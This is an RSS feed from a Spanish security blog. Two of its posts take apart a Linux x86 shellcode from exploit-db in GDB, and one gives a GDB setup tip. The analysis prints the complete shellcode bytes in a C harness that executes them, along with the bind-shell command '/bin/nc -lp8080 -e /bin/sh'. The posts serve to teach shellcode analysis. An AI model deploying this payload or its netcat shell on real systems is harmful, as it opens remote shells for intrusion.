<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="../assets/xml/rss.xsl" media="all"?><rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>deibit (gdb)</title><link>http://deibit.com/</link><description></description><atom:link type="application/rss+xml" rel="self" href="http://deibit.com/categories/gdb.xml"></atom:link><language>es</language><lastBuildDate>Sun, 17 Jul 2016 09:42:34 GMT</lastBuildDate><generator>https://getnikola.com/</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>Analizando un shellcode (II)</title><link>http://deibit.com/posts/2011/02/12/analizando-un-shellcode-ii/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Tenemos el desemsamblado del programa (shellcode.c), vamos a ir viendo paso a paso la ejecución:&lt;/p&gt;
&lt;p&gt;En gris se encuentra resaltada la parte donde se encuentra la cadena “./bin/nc -lp8080 -e /bin/sh”&lt;/p&gt;
&lt;p&gt;[sourcecode highlight="20,21,22,23,24,25,26,27"]&lt;br&gt;
(gdb) x/38i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a077 &amp;lt;shellcode+55&amp;gt;:	arpl   %sp,(%ebx)&lt;br&gt;
   0x804a079 &amp;lt;shellcode+57&amp;gt;:	sub    $0x3038706c,%eax&lt;br&gt;
   0x804a07e &amp;lt;shellcode+62&amp;gt;:	cmp    %dh,(%eax)&lt;br&gt;
   0x804a080 &amp;lt;shellcode+64&amp;gt;:	and    0x69622f65,%ebp&lt;br&gt;
   0x804a086 &amp;lt;shellcode+70&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a087 &amp;lt;shellcode+71&amp;gt;:	das&lt;br&gt;
   0x804a088 &amp;lt;shellcode+72&amp;gt;:	jae    0x804a0f2&lt;br&gt;
   0x804a08a &amp;lt;shellcode+74&amp;gt;:	and    (%eax),%eax&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Una vez que se consigue explotar una vulnerabilidad y desviar el flujo de ejecución del programa hacia nuestro shellcode la primera instrucción es un salto:&lt;/p&gt;
&lt;p&gt;0x804a040 :   jmp    0x804a06c &lt;/p&gt;
&lt;p&gt;que lleva a una llamada:&lt;/p&gt;
&lt;p&gt;0x804a06c :     call   0x804a042 &lt;/p&gt;
&lt;p&gt;que vuelve a posicionarnos justo debajo del salto:&lt;/p&gt;
&lt;p&gt; 0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;¿Curioso no? ¿Para que tanto ir y volver si acabamos justo debajo de donde empezamos?&lt;/p&gt;
&lt;p&gt;Principalmente por dos razones:&lt;/p&gt;
&lt;p&gt;1.- Evitar bytes nulos ’0x00′. Esto se hace al efectuar el salto ‘jmp’. Si hubiésemos usado un call añadiríamos bytes nulos.&lt;br&gt;
2.- Necesitamos una referencia. Una dirección sobre la que pivotar. &lt;/p&gt;
&lt;p&gt;Respecto del primer punto es obvio y ya se comentó antes. El segundo tiene su explicación.&lt;/p&gt;
&lt;p&gt;Nuestro shellcode debe ser independiente de la posición donde se encuentre el código. Recordemos que nuestro código se va a ejecutar en la pila y que las direcciones de la pila cambiarán en cada ejecución debido al carácter dinámico de esta. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;¿Como obtener ese punto de referencia?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Al efectuar una llamada ‘call   0x804a042 ‘ se va a dejar en la pila la dirección de retorno para que cuando se vuelva de la llamada el flujo de ejecución prosiga. Ahora bien, si observamos…¿Que hay debajo de la llamada? &lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;La cadena “./bin/nc -lp8080 -e /bin/sh”.&lt;/p&gt;
&lt;p&gt;Por lo tanto ya tenemos en la pila, en una posición conocida, la dirección de la cadena para usarla como parámetro para la llamada al sistema.&lt;/p&gt;
&lt;p&gt;Ese pop que vimos:&lt;/p&gt;
&lt;p&gt; 0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;Va a almacenar la dirección de retorno que se a “pusheado” en la pila al efectuar la llamada en el registro “esi”.&lt;/p&gt;
&lt;p&gt;Vemos la secuencia con más detenimiento:&lt;/p&gt;
&lt;p&gt;Saltamos:&lt;br&gt;
0x804a040 :	jmp    0x804a06c &lt;/p&gt;
&lt;p&gt;Creamos la llamada, depositando la dirección de retorno en la pila:&lt;br&gt;
0x804a06c :     call   0x804a042 &lt;/p&gt;
&lt;p&gt;Y sacamos de la pila esa dirección almacenándola en “esi”:&lt;br&gt;
0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;La llamada al sistema &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;La finalidad última del shellcode estudiado es llamar al programa ‘netcat’ abriendo el puerto 8080 para poner en él a la escucha una shell.&lt;/p&gt;
&lt;p&gt;Esto lo hace a través de una syscall. Una llamada al sistema. &lt;/p&gt;
&lt;p&gt;En el código podemos situarla aquí:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Se cargan los parámetros en los registros eax, ebx, ecx y edx. Y se llama a la interrupción 0x80. Esta interrupción le indica al kernel que queremos efectuar una llamada al sistema. &lt;/p&gt;
&lt;p&gt;Exactamente qué llamada va a ir indicada en el registro eax. Y va a ir designada por un número definido por una constante en un fichero:&lt;/p&gt;
&lt;p&gt;(el fichero es unistd.h, pero en Ubuntu para 32 bits, por ejemplo, la veremos en la ruta indicada abajo)&lt;/p&gt;
&lt;p&gt;$ cat /usr/include/asm/unistd_32.h &lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp" highlight="19"]&lt;br&gt;
#ifndef _ASM_X86_UNISTD_32_H&lt;br&gt;
#define _ASM_X86_UNISTD_32_H&lt;/p&gt;
&lt;p&gt;/*&lt;br&gt;
 * This file contains the system call numbers.&lt;br&gt;
 */&lt;/p&gt;
&lt;p&gt;#define __NR_restart_syscall      0&lt;br&gt;
#define __NR_exit		  1&lt;br&gt;
#define __NR_fork		  2&lt;br&gt;
#define __NR_read		  3&lt;br&gt;
#define __NR_write		  4&lt;br&gt;
#define __NR_open		  5&lt;br&gt;
#define __NR_close		  6&lt;br&gt;
#define __NR_waitpid		  7&lt;br&gt;
#define __NR_creat		  8&lt;br&gt;
#define __NR_link		  9&lt;br&gt;
#define __NR_unlink		 10&lt;br&gt;
#define __NR_execve		 11&lt;br&gt;
#define __NR_chdir		 12&lt;br&gt;
#define __NR_time		 13&lt;br&gt;
#define __NR_mknod		 14&lt;br&gt;
#define __NR_chmod		 15&lt;br&gt;
#define __NR_lchown		 16&lt;br&gt;
#define __NR_break		 17&lt;br&gt;
…&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Si observamos lo que estamos cargando en eax:&lt;/p&gt;
&lt;p&gt;  0x804a060 :	mov    $0xb,%al&lt;/p&gt;
&lt;p&gt;En decimal ’0xb’ es ’11′ lo que correspondería a:&lt;/p&gt;
&lt;p&gt;#define __NR_execve		 11&lt;/p&gt;
&lt;p&gt;la llamada al sistema execve. &lt;/p&gt;
&lt;p&gt;Si miramos su página man:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
EXECVE(2)                                          Linux Programmer’s Manual                                         EXECVE(2)&lt;/p&gt;
&lt;p&gt;NAME&lt;br&gt;
       execve – execute program&lt;/p&gt;
&lt;p&gt;SYNOPSIS&lt;br&gt;
       #include &amp;lt;unistd.h&amp;gt;&lt;/p&gt;
&lt;p&gt;       int execve(const char *filename, char *const argv[],&lt;br&gt;
                  char *const envp[]);&lt;/p&gt;
&lt;p&gt;DESCRIPTION&lt;br&gt;
       execve()  executes the program pointed to by filename.  filename must be either a binary executable, or a script start‐&lt;br&gt;
       ing with a line of the form:&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Vemos que necesita 3 parámetros: filename, argv y envp. Respectivamente, el nombre del programa, un array con los parámetros para ese programa y un array con las variables de entorno para ese programa que queramos fijar. &lt;/p&gt;
&lt;p&gt;Estos parámetros van a ir en los otros registros que hemos visto: ebx, ecx y edx.&lt;/p&gt;
&lt;p&gt;Más en la siguiente entrega.&lt;/p&gt;
</description><category>Basic</category><category>exploit</category><category>exploiting</category><category>gdb</category><category>seguridad</category><category>shellcode</category><guid>http://deibit.com/posts/2011/02/12/analizando-un-shellcode-ii/</guid><pubDate>Sat, 12 Feb 2011 09:45:22 GMT</pubDate></item><item><title>Analizando un shellcode (I)</title><link>http://deibit.com/posts/2011/01/19/analizando-un-shellcode-i/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Cogemos un shellcode que nos interesa y queremos saber como funciona por si hace cosas “raras”.&lt;/p&gt;
&lt;p&gt;El objeto de estudio será este &lt;a href="http://www.exploit-db.com/exploits/14332/"&gt;shellcode&lt;/a&gt; publicado en &lt;a href="http://www.exploit-db.com/"&gt;exploit-db&lt;/a&gt;. La elección ha sido puramente aleatoria, lo único que fuese para Linux, 32 bits y arquitectura Intel.&lt;/p&gt;
&lt;p&gt;Vemos el código en C:&lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp" highlight="1,2,3,4"]&lt;br&gt;
char shellcode[] =&lt;br&gt;
"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\&lt;br&gt;
x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d&lt;br&gt;
\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23";&lt;/p&gt;
&lt;p&gt;int main()&lt;br&gt;
{&lt;br&gt;
    int *ret;&lt;br&gt;
    ret = (int *)&amp;amp;ret + 2;&lt;br&gt;
    (*ret) = (int)shellcode;&lt;br&gt;
}&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Compilamos con información de debug:&lt;/p&gt;
&lt;p&gt;$ gcc -g shellcode.c -o shellcode&lt;/p&gt;
&lt;p&gt;Tendremos el símbolo shellcode en la sección ‘.data’ donde están las variables globales inicializadas.&lt;/p&gt;
&lt;p&gt;$ nm shellcode&lt;/p&gt;
&lt;p&gt;Arrancamos GDB y examinamos la parte que corresponde al símbolo ‘shellcode’:&lt;/p&gt;
&lt;p&gt;$ gdb shellcode&lt;br&gt;
(gdb) x/30i shellcode&lt;/p&gt;
&lt;p&gt;[sourcecode highlight="36"]&lt;br&gt;
(gdb) x/30i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a077 &amp;lt;shellcode+55&amp;gt;:	arpl   %sp,(%ebx)&lt;br&gt;
   0x804a079 &amp;lt;shellcode+57&amp;gt;:	sub    $0x3038706c,%eax&lt;br&gt;
   0x804a07e &amp;lt;shellcode+62&amp;gt;:	cmp    %dh,(%eax)&lt;br&gt;
   0x804a080 &amp;lt;shellcode+64&amp;gt;:	and    0x69622f65,%ebp&lt;br&gt;
   0x804a086 &amp;lt;shellcode+70&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a087 &amp;lt;shellcode+71&amp;gt;:	das&lt;br&gt;
   0x804a088 &amp;lt;shellcode+72&amp;gt;:	jae    0x804a0f2&lt;br&gt;
   0x804a08a &amp;lt;shellcode+74&amp;gt;:	and    (%eax),%eax&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Si vemos la cadena hexadecimal del shellcode (en el código fuente) notaremos que entre los bytes no se encuentra ningún ’0x00′.&lt;/p&gt;
&lt;p&gt;Esto es básico a la hora de diseñar un shellcode: No debe contener el caracter NULL.&lt;/p&gt;
&lt;p&gt;La explicación es sencilla. Imaginemos que la vulnerabilidad a explotar reside en una función que copia una cadena procedente de una entrada (por red, directamente del usuario, un archivo…) hacia un buffer. Si no comprueba el tamaño podría exceder de la memoria reservada y sobreescribir donde no debe o donde no puede. Un error de manual.&lt;/p&gt;
&lt;p&gt;Si la función usa ‘strcpy’ y nuestro shellcode contiene un byte NULL, al ser interpretado es el equivalente a decirle a ‘strcpy’ que el final de la cadena ha llegado con lo cual nuestro shellcode no funcionará. Algo similar a como funciona el ataque de &lt;a href="http://insecure.org/news/P55-07.txt"&gt;“Null Byte Poison&lt;/a&gt;” solo que en este último nos aprovechamos justamente de eso.&lt;/p&gt;
&lt;p&gt;Ahí es donde entra la genialidad de los diseñadores de shellcodes y lo que representa un arte y desafio. Usar instrucciones equivalentes o cuyos efectos colaterales se aprovechen para hacer más pequeño el shellcode, evitar bytes nulos o hacer el código independiente de la posición que ocupe en memoria entre otros.&lt;/p&gt;
&lt;p&gt;Más de esto en un futuro post.&lt;/p&gt;
&lt;p&gt;Volviendo al shellcode que estamos viendo, vamos a diseccionarlo:&lt;/p&gt;
&lt;p&gt;En principio este shellcode abrirá una conexión en el puerto 8080 poniendo allí a un netcat en escucha el cual ejecuta un proceso “/bin/sh” (omnipresente en cualquier unix) con la opción ‘-e’ (no siempre presente en todos los netcat). Esto nos proporcionaría una shell en el sistema atacado. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Y…¿Donde está la llamada a NetCat en el código?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Interpretada como instrucciones. Hay que tener en cuenta que un byte no dice nada por si mismo, pueden ser datos o pueden ser instrucciones. Hacer un x/i (el comando en GDB para e&lt;strong&gt;x&lt;/strong&gt;aminar &lt;strong&gt;i&lt;/strong&gt;nstrucciones) sobre una dirección cualquiera de un proceso hará que se desensamble e interprete tal como esté, a partir de esa dirección.&lt;/p&gt;
&lt;p&gt;Sin embargo si efectuamos un volcado hexadecimal podremos observar algo familiar:&lt;/p&gt;
&lt;p&gt;$ hexdump -C shellcode&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
00001070  ff 2f 62 69 6e 2f 6e 63  23 2d 6c 70 38 30 38 30  |./bin/nc#-lp8080|&lt;br&gt;
00001080  23 2d 65 2f 62 69 6e 2f  73 68 23 00 44 69 72 3a  |#-e/bin/sh#.Dir:|&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Vamos a compararlo con cierta parte del shellcode que está en el código fuente:&lt;/p&gt;
&lt;p&gt;xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\&lt;/p&gt;
&lt;p&gt;El shellcode nos ocupa la siguiente posición:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
(gdb) x/20wx shellcode&lt;br&gt;
0x804a040 &amp;lt;shellcode&amp;gt;:	0x315e2aeb	0x074688c0	0x880f4688	0x76891946&lt;br&gt;
0x804a050 &amp;lt;shellcode+16&amp;gt;:	0x085e8d1a	0x8d1e5e89	0x5e89105e	0x26468922&lt;br&gt;
0x804a060 &amp;lt;shellcode+32&amp;gt;:	0xf3890bb0	0x8d1a4e8d	0x80cd2656	0xffffd1e8&lt;br&gt;
0x804a070 &amp;lt;shellcode+48&amp;gt;:	0x69622fff	0x636e2f6e	0x706c2d23	0x30383038&lt;br&gt;
0x804a080 &amp;lt;shellcode+64&amp;gt;:	0x2f652d23	0x2f6e6962	0x00236873	0x00000000&lt;/p&gt;
&lt;p&gt;[/sourcecode]&lt;/p&gt;
&lt;p&gt;Observamos que la cadena comienza en: 0x0804a070 y le decimos a GDB que la muestre como código:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
(gdb) x/11i 0x0804a070&lt;br&gt;
   0x804a070 &amp;lt;shellcode+48&amp;gt;:	ljmp   *(%edi)&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a077 &amp;lt;shellcode+55&amp;gt;:	arpl   %sp,(%ebx)&lt;br&gt;
   0x804a079 &amp;lt;shellcode+57&amp;gt;:	sub    $0x3038706c,%eax&lt;br&gt;
   0x804a07e &amp;lt;shellcode+62&amp;gt;:	cmp    %dh,(%eax)&lt;br&gt;
   0x804a080 &amp;lt;shellcode+64&amp;gt;:	and    0x69622f65,%ebp&lt;br&gt;
   0x804a086 &amp;lt;shellcode+70&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a087 &amp;lt;shellcode+71&amp;gt;:	das&lt;br&gt;
   0x804a088 &amp;lt;shellcode+72&amp;gt;:	jae    0x804a0f2&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Como podemos observar no guarda ningún sentido porque son lo que son: datos.&lt;/p&gt;
&lt;p&gt;Bueno, como esto está quedando un poco largo voy a dejar lo siguiente, el paso a paso del shellcode, en un siguiente post.&lt;/p&gt;
</description><category>Basic</category><category>gdb</category><category>seguridad</category><category>shellcode</category><guid>http://deibit.com/posts/2011/01/19/analizando-un-shellcode-i/</guid><pubDate>Wed, 19 Jan 2011 17:25:11 GMT</pubDate></item><item><title>Opciones de inicio en GDB</title><link>http://deibit.com/posts/2010/09/07/opciones-de-inicio-en-gdb/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Si queremos que GDB arranque con la sintaxis de Intel desde el inicio (o cualquier otra opción) creamos el archivo .gdbinit en el home.&lt;/p&gt;
&lt;p&gt;Dentro simplemente añadimos las opciones que queramos:&lt;/p&gt;
&lt;p&gt;set disassembly-flavor intel&lt;/p&gt;
</description><category>debugging</category><category>gdb</category><guid>http://deibit.com/posts/2010/09/07/opciones-de-inicio-en-gdb/</guid><pubDate>Tue, 07 Sep 2010 10:15:00 GMT</pubDate></item></channel></rss>